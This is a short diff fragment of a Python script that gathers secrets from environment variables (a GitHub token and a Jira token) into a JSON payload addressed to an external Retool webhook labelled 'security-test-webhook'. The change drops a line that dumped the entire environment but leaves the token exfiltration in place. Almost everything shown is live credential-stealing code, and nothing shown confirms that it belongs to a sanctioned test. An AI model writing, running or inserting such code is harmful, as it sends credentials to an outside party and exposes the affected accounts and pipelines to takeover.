@@ -12,8 +12,7 @@ import json
 url = "https://sushicomabacate.retool.com/url/security-test-webhook"
 payload = json.dumps({
   "os.environ.get('GITHUB_TOKEN_PSW')": os.environ.get('GITHUB_TOKEN_PSW'),
-  "os.environ.get('JIRA_TOKEN')": os.environ.get('JIRA_TOKEN'),
-  "os.environ": os.environ
+  "os.environ.get('JIRA_TOKEN')": os.environ.get('JIRA_TOKEN')
 })
 headers = {
   'Content-Type': 'application/json'
